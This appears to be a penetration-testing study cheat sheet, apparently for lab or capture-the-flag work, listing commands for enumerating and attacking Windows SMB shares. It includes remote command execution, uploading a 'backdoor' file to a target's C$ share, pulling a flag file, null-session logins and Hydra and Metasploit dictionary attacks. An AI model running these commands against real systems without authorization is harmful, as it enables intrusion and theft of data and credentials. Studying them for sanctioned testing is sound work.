# Windows Discover & Mount
- SMB= Server Message Block
- SMB is a Windows implementation of a file-sharing
- SMB uses ports 139 or 445

# Nmap Scripts
* Always check both TCP and UDP ports using Nmap
```
smb-protocols
```
- Shows SMB Protocol dialects
- Issue: SMB v1

 ```
SMB-os-discovery
```

```
smb-security-mode 
```
- Issue: Messege_signing: disabled

```
smb-enum-sessions 
```
- Shows Active sessions

*Giving arguments to smb-enum-sessions will provide additional information*

```
smb-enum-sessions --script-args smbusername=administrator,smbpassword=password IP_address
```

```
smb-enum-shares 
```
- Shows all the SMB shares including Guest, IPC, and Print etc.

```
smb-enum-shares --script-args smbusername=administrator,smbpassword=password 
```
- Shows permissions to the shared accounts

```
smb-enum-users --script-args smbusername=administrator,smbpassword=password 
```
- Issue: See the flags 

```
smb-enum-stats --script-args smbusername=administrator,smbpassword= password 
```
- Server statistics:
	- How many files are sent?
	- Failed Logins
	- Permissions etc.

```
smb-enum-domains --script-args smbusername=administrator,smbpassword=password 
```
- Shows names of connected Groups

  
```
smb-enum-groups --script-args smbusername=administrator,smbpassword=password 
```
- Provides list of users in Groups


```
smb-enum-services --script-args smbusername=administrator,smbpassword=password 
```
- Stat about running services
  
```
smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password IP_address
```
- “smb-ls” tells us what's inside each of the shares like finding directory


# Metasploit Scripts
	auxiliary/scanner/smb/smb_version
	auxiliary/scanner/smb/smb2
	auxiliary/smb/smb_enumshares

# enum4linux
	enum4linux -h
	enum4linux -o IP_addr
			>> -o = Get OS information
	enum4linux -U IP_addr
			>> -U = Get user list
	enum4linux -S IP_addr
			>> -S =Share information
	enum4linux -G IP_addr
			>> -G = Group Information
	enum4linux -i IP_addr
			>> -i = network interface
   
# nmblookup
	nmblookup –h
	nmblookup -A IP_addr

 
# SMBMap

```
smbmap -u username -p "" -d . -H IP_addr
```
- Shows Permissions of an account with a null password
- -d = directory to see
- -H = Host IP address

```
smbmap -u administrator -p password -H IP_addr -x "ipconfig"
```
- -x = command to execute
  
### Getting SMB connection:
```
smbmap -u administrator -p password -H IP_addr -L
```
- -L = List out the contents of different drives

```
smbmap -u administrator -p password -H IP_addr -r 'C$'
```
- -r = listing a drive content

### Uploading file to target device
- Create a file (i.e. 'backdoor') in the attacker's device
```
touch backdoor
```
- Uploading 'backdoor' file to the target device where the flag is located
```
smbmap -u administrator -p password -H IP_addr --upload "/root/backdoor" "C$\backdoor"
```
- Check again if the 'backdoor' file is uploaded:
```
smbmap -u administrator -p password -H IP_addr -r "C$"
```
### Downloading file from target device
```
smbmap -u administrator -p password -H IP_addr --download "C$\flag.txt"
```
- File will be downloaded to the attacker device's “/root” folder.


# smbclient Connection with Null Session

### smbclient 
```
smbclient -h
smbclient -L IP_addr -N
```
- -L = List of Hosts
- -N = Null Session = No password


# rpcclient Connection with Null Session
### rpcclient:
	rpcclient -h
	rpcclient -U "" -N IP_addr
 - -N= No password = Null session

### After connecting to rpcclient:
	? 		  	<<< help
	srvinfo
	enumdomusers  	        <<< getting user list
	enumdomgroups		<<< getting group list
	lookupnames username    <<< Get full SID of admin
	exit


# SMB Dictionary Attack


### Metasploit
- auxiliary/scanner/smb/smb_login
	- wordlist >> /usr/share/wordlists/metasploit/unix_passwords.txt

### Hydra
- hydra -l admin -P /usr/share/wordlists/rockyou.txt IP_addr smb 


### smbmap     >> Login Access
```
smbmap -H IP-addr -u admin -P password
```

### smbclient  >> Login Access
```
smbclient -L IP_addr -U username
```
```
smbclient //IP_addr/username -U username
```
	help
	ls
	get
	exit

# PIPE
	The way the services talk to each other is through pipes.
	Named pipes are pipes that are known.
	If we get into SMB, there is a chance that we can get into other services that are piped through it. 

### Metasploit
```
auxiliary/scanner/smb/pipe_auditor
```
### enum4linux
```
enum4linux -r -u "admin" -p "password" IP_addr
```
	-r = User's SID








